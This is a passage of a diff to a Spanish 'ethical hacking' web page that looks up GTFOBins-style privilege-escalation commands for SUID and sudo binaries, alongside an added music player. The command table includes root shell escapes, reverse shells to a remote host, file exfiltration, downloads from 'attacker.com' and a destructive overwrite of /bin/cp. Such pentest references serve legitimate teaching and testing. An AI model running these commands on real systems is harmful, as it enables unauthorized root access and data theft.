@@ -1,351 +1,418 @@
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VULN SUID TOOL - MAYUSO ETHICAL HACKING</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Roboto+Mono:wght@300;400;500&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-    <link rel="stylesheet" href="styles.css">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/dist/tabler-icons.min.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>VULN SUID TOOL - MAYUSO ETHICAL HACKING</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Roboto+Mono:wght@300;400;500&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link rel="stylesheet" href="styles.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/dist/tabler-icons.min.css">
 </head>
-    
+
 <body>
 
-    <nav>
-        <div class="logo-text">
-            <a href="index.html" class="logo-link">
-                ❰ <span style="color: white;">MAYUSO</span>
-                <span style="color: var(--accent);">ETHICAL HACKING</span> ❱
-            </a>
-        </div>
-        <div class="nav-links">
-            <a href="index.html">/HOME</a>
-            <a href="pentestools.html">/PENTESTOOLS</a>
-            <a href="whoami.html">/WHOAMI</a>
-        </div>
-    </nav>
+  <nav>
+    <div class="logo-text">
+      <a href="index.html" class="logo-link">
+        ❰ <span style="color: white;">MAYUSO</span>
+        <span style="color: var(--accent);">ETHICAL HACKING</span> ❱
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="index.html">/HOME</a>
+      <a href="pentestools.html">/PENTESTOOLS</a>
+      <a href="whoami.html">/WHOAMI</a>
+      <!-- Botón de Música -->
+      <button id="playBtn" class="play-button">
+          <i class="ti ti-player-play"></i>
+      </button>
+    </div>
+  </nav>
 
-    <canvas id="matrix"></canvas>
+  <audio id="backgroundMusic" loop>
+      <source src="music.mp3" type="audio/mpeg">
+  </audio>
 
-    <header>
-      <br>
-    </header>
+  <!-- SCRIPT de Música -->
 
-    <section>
-        <h2 style="font-family: 'Orbitron';">BUSCADOR DE BINARIOS SUID VULNERABLES</h2>
-        <br>
-        <p style="text-align: center;">Buscador de binarios con permisos SUID más comunes en Linux y las formas de explotarlos para escalar privilegios a root.</p>
-        <br><br>
+  <script>
+      const music = document.getElementById('backgroundMusic');
+      const playBtn = document.getElementById('playBtn');
 
-        <div class="">
+      // Recuperar estado al cargar la página
+      function loadMusicState() {
+          const isPlaying = localStorage.getItem('musicPlaying') === 'true';
+          const currentTime = parseFloat(localStorage.getItem('musicTime')) || 0;
 
-<!-- TOOL START -->
-            
-<div class="suid-container" style="background: #0f1626; border: 2px solid rgba(255, 0, 51, 0.45); border-radius: 10px; padding: 20px; width: 900px; max-width: 95%; margin: 15px auto; box-shadow: 0 0 15px rgba(255, 0, 51, 0.15); color: #e0f2fe;">
+          if (isPlaying) {
+              music.currentTime = currentTime;
+              music.play().then(() => {
+                  playBtn.innerHTML = '<i class="ti ti-player-pause"></i>';
+                  playBtn.classList.add('playing');
+              });
+          }
+      }
 
+      // Guardar estado cuando se reproduce o pausa
+      function saveMusicState() {
+          localStorage.setItem('musicPlaying', !music.paused);
+          localStorage.setItem('musicTime', music.currentTime);
+      }
+
+      playBtn.addEventListener('click', () => {
+          if (music.paused) {
+              music.play();
+              playBtn.innerHTML = '<i class="ti ti-player-pause"></i>';
+              playBtn.classList.add('playing');
+          } else {
+              music.pause();
+              playBtn.innerHTML = '<i class="ti ti-player-play"></i>';
+              playBtn.classList.remove('playing');
+          }
+          saveMusicState();
+      });
+
+      // Guardar estado antes de cambiar de página
+      window.addEventListener('beforeunload', saveMusicState);
+
+      // Cargar estado al iniciar
+      window.addEventListener('load', loadMusicState);
+  </script>
+
+  <canvas id="matrix"></canvas>
+
+  <header>
     <br>
+  </header>
 
-    <select id="binarySelect" onchange="displayExploits()" 
-            style="width: 100%; padding: 10px; margin-bottom: 15px; background: #1a2333; border: 1px solid #555; color: white; border-radius: 6px; font-size: 0.85rem;">
-        <option value="">Selecciona un binario</option>
-        <option value="awk">🅱️ awk</option>
-        <option value="cat">🅱️ cat</option>
-        <option value="cp">🅱️ cp</option>
-        <option value="cut">🅱️ cut</option>
-        <option value="dd">🅱️ dd</option>
-        <option value="env">🅱️ env</option>
-        <option value="find">🅱️ find</option>
-        <option value="grep">🅱️ grep</option>
-        <option value="less">🅱️ less</option>
-        <option value="more">🅱️ more</option>
-        <option value="mv">🅱️ mv</option>
-        <option value="nano">🅱️ nano</option>
-        <option value="nmap">🅱️ nmap</option>
-        <option value="perl">🅱️ perl</option>
-        <option value="python">🅱️ python</option>
-        <option value="ruby">🅱️ ruby</option>
-        <option value="sed">🅱️ sed</option>
-        <option value="sh">🅱️ sh</option>
-        <option value="su">🅱️ su</option>
-        <option value="sudo">🅱️ sudo</option>
-        <option value="tar">🅱️ tar</option>
-        <option value="vi">🅱️ vi</option>
-        <option value="vim">🅱️ vim</option>
-    </select>
+  <section>
+    <div style="text-align: center; margin-bottom: 0px;">
+      <i class="ti ti-shield-exclamation" style="color: var(--accent); font-size: 2.4rem; margin-bottom: 0px;"></i>
+      <h2 style="font-family: 'Orbitron', sans-serif; margin: 0;">BUSCADOR DE BINARIOS SUID VULNERABLES</h2>
+    </div>
+    <br>
+    <p style="text-align: center;">Buscador de binarios con permisos SUID más comunes en Linux y las formas de
+      explotarlos para escalar privilegios a root.</p>
+    <br><br>
 
-    <div id="exploitOutput" style="min-height: 150px;">
-        <p class="no-selection" style="color: #888; text-align: center; margin-top: 40px; font-size: 0.80rem;">No hay binario seleccionado.</p>
-        <table id="exploitTable" style="display: none; width: 100%; border-collapse: collapse; font-size: 0.80rem; background: #1a2333;">
+    <div class="">
+
+      <!-- TOOL START -->
+
+      <div class="suid-container"
+        style="background: #0f1626; border: 2px solid rgba(255, 0, 51, 0.45); border-radius: 10px; padding: 20px; width: 900px; max-width: 95%; margin: 15px auto; box-shadow: 0 0 15px rgba(255, 0, 51, 0.15); color: #e0f2fe;">
+
+        <br>
+
+        <select id="binarySelect" onchange="displayExploits()"
+          style="width: 100%; padding: 10px; margin-bottom: 15px; background: #1a2333; border: 1px solid #555; color: white; border-radius: 6px; font-size: 0.85rem;">
+          <option value="">Selecciona un binario</option>
+          <option value="awk">🅱️ awk</option>
+          <option value="cat">🅱️ cat</option>
+          <option value="cp">🅱️ cp</option>
+          <option value="cut">🅱️ cut</option>
+          <option value="dd">🅱️ dd</option>
+          <option value="env">🅱️ env</option>
+          <option value="find">🅱️ find</option>
+          <option value="grep">🅱️ grep</option>
+          <option value="less">🅱️ less</option>
+          <option value="more">🅱️ more</option>
+          <option value="mv">🅱️ mv</option>
+          <option value="nano">🅱️ nano</option>
+          <option value="nmap">🅱️ nmap</option>
+          <option value="perl">🅱️ perl</option>
+          <option value="python">🅱️ python</option>
+          <option value="ruby">🅱️ ruby</option>
+          <option value="sed">🅱️ sed</option>
+          <option value="sh">🅱️ sh</option>
+          <option value="su">🅱️ su</option>
+          <option value="sudo">🅱️ sudo</option>
+          <option value="tar">🅱️ tar</option>
+          <option value="vi">🅱️ vi</option>
+          <option value="vim">🅱️ vim</option>
+        </select>
+
+        <div id="exploitOutput" style="min-height: 150px;">
+          <p class="no-selection" style="color: #888; text-align: center; margin-top: 40px; font-size: 0.80rem;">No hay
+            binario seleccionado.</p>
+          <table id="exploitTable"
+            style="display: none; width: 100%; border-collapse: collapse; font-size: 0.80rem; background: #1a2333;">
             <thead>
-                <tr style="background: #1f2a3f;">
-                    <th style="padding: 8px; text-align: left; border-bottom: 1px solid #444;">Tipo</th>
-                    <th style="padding: 8px; text-align: left; border-bottom: 1px solid #444;">Descripción / Comando</th>
-                </tr>
+              <tr style="background: #1f2a3f;">
+                <th style="padding: 8px; text-align: left; border-bottom: 1px solid #444;">Tipo</th>
+                <th style="padding: 8px; text-align: left; border-bottom: 1px solid #444;">Descripción / Comando</th>
+              </tr>
             </thead>
             <tbody></tbody>
-        </table>
-    </div>
+          </table>
+        </div>
 
-    <p style="font-size: 0.8rem; color: #777; text-align: center; margin-top: 12px;">
-        Fuente: <a href="https://gtfobins.github.io" style="color: #00b7eb;">GTFOBins</a>
-    </p>
-</div>
+        <p style="font-size: 0.8rem; color: #777; text-align: center; margin-top: 12px;">
+          Fuente: <a href="https://gtfobins.github.io" style="color: #00b7eb;">GTFOBins</a>
+        </p>
+      </div>
 
-<script>
-    const exploits = {
-      awk: {
-        shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "awk 'BEGIN {system(\"/bin/sh\")}'" },
-        file_read: { description: "Lee datos de archivos y puede usarse para realizar lecturas con privilegios elevados o revelar archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_leer]\nawk '//' \"$LFILE\"" },
-        file_write: { description: "Escribe datos en archivos y puede usarse para realizar escrituras con privilegios elevados o escribir archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_escribir]\nawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'" },
-        sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo awk 'BEGIN {system(\"/bin/sh\")}'" }
-      },
-      cat: {
-        file_read: { description: "Lee datos de archivos y puede usarse para realizar lecturas con privilegios elevados o revelar archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_leer]\ncat \"$LFILE\"" },
-        sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "LFILE=[archivo_para_leer]\nsudo cat \"$LFILE\"" }
-      },
-      cp: {
-        file_read: { description: "Lee datos de archivos y puede usarse para realizar lecturas con privilegios elevados o revelar archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_leer]\ncp \"$LFILE\" /dev/stdout" },
-        file_write: { description: "Escribe datos en archivos y puede usarse para realizar escrituras con privilegios elevados o escribir archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_escribir]\necho \"DATA\" | cp /dev/stdin \"$LFILE\"\n\n# Alternativa\nLFILE=[archivo_para_escribir]\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n\n# Acción destructiva\nsudo cp /bin/sh /bin/cp\nsudo cp" },
-        sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "LFILE=[archivo_para_escribir]\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n\n# Alternativa\nLFILE=[archivo_para_escribir]\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n\n# Acción destructiva\nsudo cp /bin/sh /bin/cp\nsudo cp" }
-      },
-      cut: {
-        file_read: { description: "Lee datos de archivos, puede usarse para realizar lecturas privilegiadas o divulgar archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_leer]\ncut -d \"\" -f1 \"$LFILE\"" },
-        sudo: { description: "Si al binario se le permite ejecutarse como superusuario mediante sudo, no elimina los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.", command: "LFILE=[archivo_para_leer]\nsudo cut -d \"\" -f1 \"$LFILE\"" }
-      },
-      dd: {
-        file_read: { description: "Lee datos de archivos y puede usarse para realizar lecturas con privilegios elevados o revelar archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_leer]\ndd if=$LFILE" },
-        sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "LFILE=[archivo_para_escribir]\necho \"data\" | sudo dd of=$LFILE" }
-      },
-      env: {
-        shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "env /bin/sh" },
-        sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo env /bin/sh" }
-      },
-      find: {
-        shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "find . -exec /bin/sh \\; -quit" },
-        file_write: { description: "Escribe datos en archivos y puede usarse para realizar escrituras con privilegios elevados o escribir archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_escribir]\nfind / -fprintf \"$LFILE\" DATA -quit" },
-        sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo find . -exec /bin/sh \\; -quit" }
-      },
-      grep: {
-        file_read: { description: "Lee datos de archivos y puede usarse para realizar lecturas con privilegios elevados o revelar archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_leer]\ngrep '' $LFILE" },
-        sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "LFILE=[archivo_para_leer]\nsudo grep '' $LFILE" }
-      },
-      less: {
-        shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "less /etc/profile\n!/bin/sh\n\n# Alternativa\nVISUAL=\"/bin/sh -c '/bin/sh'\" less /etc/profile\nv\n\n# Alternativa\nless /etc/profile\nv:shell" },
-        file_read: { description: "Lee datos de archivos y puede usarse para realizar lecturas con privilegios elevados o revelar archivos fuera de un sistema de archivos restringido.", command: "less [archivo_para_leer]\n\n# Cuando less es paginador\nless /etc/profile :e [archivo_para_leer]" },
-        file_write: { description: "Escribe datos en archivos y puede usarse para realizar escrituras con privilegios elevados o escribir archivos fuera de un sistema de archivos restringido.", command: "echo DATA | less s[archivo_para_escribir] q\n\n# Invoca editor\nless [archivo_para_escribir] v" },
-        sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo less /etc/profile\n!/bin/sh" }
-      },
-      more: {
-        shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "TERM= more /etc/profile\n!/bin/sh" },
-        file_read: { description: "Lee datos de archivos y puede usarse para realizar lecturas con privilegios elevados o revelar archivos fuera de un sistema de archivos restringido.", command: "more [archivo_para_leer]" },
-        sudo: { description: "Si se permite que el binario se ejecute como superusuario mediante sudo, no pierde los privilegios elevados y puede ser utilizado para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.", command: "TERM= sudo more /etc/profile\n!/bin/sh" }
-      },
-      mv: {
-        sudo: { description: "Si se permite que el binario se ejecute como superusuario mediante sudo, no pierde los privilegios elevados y puede ser utilizado para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.", command: "LFILE=[archivo_para_escribir]\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE" }
-      },
-      nano: {
-        shell: { description: "Puede usarse para salir de entornos restringidos al generar un shell de sistema interactivo.", command: "nano\n^R^X\nreset; sh 1>&0 2>&0\n\n# Alternativa\nnano -s /bin/sh\n/bin/sh\n^T" },
-        file_read: { description: "Lee datos de archivos, puede usarse para realizar lecturas privilegiadas o revelar archivos fuera de un sistema de archivos restringido.", command: "nano [archivo_para_leer]" },
-        file_write: { description: "Escribe datos en archivos, puede usarse para realizar escrituras privilegiadas o escribir archivos fuera de un sistema de archivos restringido.", command: "nano [archivo_para_escribir] DATA ^O" },
-        sudo: { description: "Si se permite que el binario se ejecute como superusuario mediante sudo, no pierde los privilegios elevados y puede ser utilizado para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.", command: "sudo nano\n^R^X\nreset; sh 1>&0 2>&0" }
-      },
-      nmap: {
-        shell: { description: "Puede usarse para salir de entornos restringidos al generar un shell de sistema interactivo.", command: "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF\n\n# Modo interactivo (versiones 2.02 a 5.21)\nnmap --interactive\nnmap> !sh" },
-        file_upload: { description: "Puede exfiltrar archivos a través de la red. Envía un archivo local a través de TCP.", command: "RHOST=[IP-URL]\nRPORT=8080\nLFILE=[archivo_para_enviar]\nnmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE" },
-        file_download: { description: "Puede descargar archivos remotos. Recupera un archivo remoto a través de TCP.", command: "RHOST=[IP-URL]\nRPORT=8080\nTF=$(mktemp -d)\nLFILE=[archivo_para_descargar]\nnmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE" },
-        file_read: { description: "Lee datos de archivos, puede usarse para realizar lecturas privilegiadas o revelar archivos fuera de un sistema de archivos restringido.", command: "TF=$(mktemp)\necho 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);' > $TF\nnmap --script=$TF\n\n# Alternativa\nnmap -iL [archivo_para_leer]" },
-        file_write: { description: "Escribe datos en archivos, puede usarse para realizar escrituras privilegiadas o escribir archivos fuera de un sistema de archivos restringido.", command: "TF=$(mktemp)\necho 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"data\"); io.close(f);' > $TF\nnmap --script=$TF\n\n# Alternativa\nLFILE=[archivo_para_escribir]\nnmap -oG=$LFILE DATA" },
-        sudo: { description: "Si se permite que el binario se ejecute como superusuario mediante sudo, no pierde los privilegios elevados y puede ser utilizado para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.", command: "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n\n# Modo interactivo (versiones 2.02 a 5.21)\nsudo nmap --interactive\nnmap> !sh" }
-      },
-      perl: {
-        shell: { description: "Puede usarse para salir de entornos restringidos al generar un shell de sistema interactivo.", command: "perl -e 'exec \"/bin/sh\";'" },
-        reverse_shell: { description: "Puede usarse para salir de entornos restringidos al generar un shell de sistema interactivo.", command: "export RHOST=[IP-URL]\nRPORT=443\nperl -e 'use Socket;$i=\"$ENV{RHOST}\";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" },
-        file_read: { description: "Lee datos de archivos, puede usarse para realizar lecturas privilegiadas o revelar archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_leer]\nperl -ne print $LFILE" },
-        sudo: { description: "Si se permite que el binario se ejecute como superusuario mediante sudo, no pierde los privilegios elevados y puede ser utilizado para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.", command: "sudo perl -e 'exec \"/bin/sh\";'" }
-      },
-      python: {
-        shell: { description: "Se puede utilizar para escapar de entornos restringidos mediante la creación de una shell del sistema interactivo.", command: "python -c 'import os; os.system(\"/bin/sh\")'" },
-        reverse_shell: { description: "Puede enviar un shell inverso a un atacante que esté escuchando, para abrir un acceso remoto a la red.", command: "export RHOST=[IP-URL]\nRPORT=443\npython -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'" },
-        file_upload: { description: "Puede exfiltrar archivos a través de la red. Envía el archivo local mediante el parámetro \"d\" en una solicitud HTTP POST.", command: "export URL=[URL]\nLFILE=[archivo_para_enviar]\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'" },
-        file_download: { description: "Puede descargar archivos remotos. Obtén un archivo remoto mediante una solicitud HTTP GET.", command: "export URL=http://attacker.com/archivo_para_descargar\nLFILE=[archivo_a_guardar]\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'" },
-        file_read: { description: "Lee datos de archivos, por lo que puede utilizarse para realizar lecturas con privilegios o divulgar archivos fuera de un sistema de archivos restringido.", command: "python -c 'print(open(\"archivo_para_leer\").read())'" },
-        file_write: { description: "Escribe datos en archivos, puede usarse para hacer escrituras privilegiadas o escribir archivos fuera de un sistema de archivos restringido.", command: "python -c 'open(\"archivo_para_escribir\",\"w+\").write(\"DATA\")'" },
-        sudo: { description: "Si el binario tiene permiso para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede utilizarse para acceder al sistema de archivos, escalar privilegios o mantener acceso privilegiado.", command: "sudo python -c 'import os; os.system(\"/bin/sh\")'" }
-      },
-      ruby: {
-        shell: { description: "Puede usarse para escapar de entornos restringidos generando un shell del sistema interactivo.", command: "ruby -e 'exec \"/bin/sh\"'" },
-        reverse_shell: { description: "Puede enviar un reverse shell a un atacante en escucha para abrir un acceso remoto a la red.", command: "export RHOST=[IP_URL]\nRPORT=443\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'" },
-        file_upload: { description: "Puede exfiltrar archivos en la red. Sirve archivos en la carpeta local ejecutando un servidor HTTP.", command: "export LPORT=8888\nruby -run -e httpd . -p $LPORT" },
-        file_download: { description: "Puede descargar archivos remotos. Obtiene un archivo remoto mediante una solicitud HTTP GET.", command: "export URL=http://attacker.com/archivo_para_descargar\nLFILE=[archivo_para_guardar]\nruby -e 'require \"open-uri\"; download = open(ENV[\"URL\"]); IO.copy_stream(download, ENV[\"LFILE\"])'" },
-        file_read: { description: "Lee datos de archivos, puede usarse para hacer lecturas privilegiadas o divulgar archivos fuera de un sistema de archivos restringido.", command: "ruby -e 'puts File.read(\"archivo_para_leer\")'" },
-        file_write: { description: "Escribe datos en archivos, puede usarse para hacer escrituras privilegiadas o escribir archivos fuera de un sistema de archivos restringido.", command: "ruby -e 'File.open(\"archivo_para_escribir\", \"w+\") { |f| f.write(\"DATA\") }'" },
-        sudo: { description: "Si el binario tiene permitido ejecutarse como superusuario mediante sudo, no descarta los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo ruby -e 'exec \"/bin/sh\"'" }
-      },
-      sed: {
-        shell: { description: "Puede usarse para escapar de entornos restringidos generando un shell del sistema interactivo. Solo versión GNU. Además, requiere bash.", command: "sed -n '1e exec sh 1>&0' /etc/hosts\n\n# Alternativa\nsed e" },
-        command: { description: "Puede usarse para escapar de entornos restringidos ejecutando comandos del sistema no interactivos. Solo versión GNU.", command: "sed -n '1e id' /etc/hosts" },
-        file_read: { description: "Lee datos de archivos, puede usarse para hacer lecturas privilegiadas o divulgar archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_leer]\nsed '' \"$LFILE\"" },
-        file_write: { description: "Escribe datos en archivos, puede usarse para hacer escrituras privilegiadas o escribir archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_escribir]\nsed -n \"1s/.*/DATA/w $LFILE\" /etc/hosts" },
-        sudo: { description: "Si el binario tiene permitido ejecutarse como superusuario mediante sudo, no descarta los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado. Solo versión GNU. Además, requiere bash.", command: "sudo sed -n '1e exec sh 1>&0' /etc/hosts" }
-      },
-      sh: {
-        shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "/bin/sh" },
-        sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo /bin/sh" }
-      },
-      su: {
-        sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo su" }
-      },
-      sudo: {
-        sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo sudo /bin/sh" }
-      },
-      tar: {
-        shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" },
-        sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" }
-      },
-      vi: {
-        shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "vi -c ':!/bin/sh' /dev/null" },
-        sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo vi -c ':!/bin/sh' /dev/null" }
-      },
-      vim: {
-        shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "vim -c ':!/bin/sh'" },
-        sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo vim -c ':!/bin/sh'" }
-      }
-    };
+      <script>
+        const exploits = {
+          awk: {
+            shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "awk 'BEGIN {system(\"/bin/sh\")}'" },
+            file_read: { description: "Lee datos de archivos y puede usarse para realizar lecturas con privilegios elevados o revelar archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_leer]\nawk '//' \"$LFILE\"" },
+            file_write: { description: "Escribe datos en archivos y puede usarse para realizar escrituras con privilegios elevados o escribir archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_escribir]\nawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'" },
+            sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo awk 'BEGIN {system(\"/bin/sh\")}'" }
+          },
+          cat: {
+            file_read: { description: "Lee datos de archivos y puede usarse para realizar lecturas con privilegios elevados o revelar archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_leer]\ncat \"$LFILE\"" },
+            sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "LFILE=[archivo_para_leer]\nsudo cat \"$LFILE\"" }
+          },
+          cp: {
+            file_read: { description: "Lee datos de archivos y puede usarse para realizar lecturas con privilegios elevados o revelar archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_leer]\ncp \"$LFILE\" /dev/stdout" },
+            file_write: { description: "Escribe datos en archivos y puede usarse para realizar escrituras con privilegios elevados o escribir archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_escribir]\necho \"DATA\" | cp /dev/stdin \"$LFILE\"\n\n# Alternativa\nLFILE=[archivo_para_escribir]\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n\n# Acción destructiva\nsudo cp /bin/sh /bin/cp\nsudo cp" },
+            sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "LFILE=[archivo_para_escribir]\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n\n# Alternativa\nLFILE=[archivo_para_escribir]\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n\n# Acción destructiva\nsudo cp /bin/sh /bin/cp\nsudo cp" }
+          },
+          cut: {
+            file_read: { description: "Lee datos de archivos, puede usarse para realizar lecturas privilegiadas o divulgar archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_leer]\ncut -d \"\" -f1 \"$LFILE\"" },
+            sudo: { description: "Si al binario se le permite ejecutarse como superusuario mediante sudo, no elimina los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.", command: "LFILE=[archivo_para_leer]\nsudo cut -d \"\" -f1 \"$LFILE\"" }
+          },
+          dd: {
+            file_read: { description: "Lee datos de archivos y puede usarse para realizar lecturas con privilegios elevados o revelar archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_leer]\ndd if=$LFILE" },
+            sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "LFILE=[archivo_para_escribir]\necho \"data\" | sudo dd of=$LFILE" }
+          },
+          env: {
+            shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "env /bin/sh" },
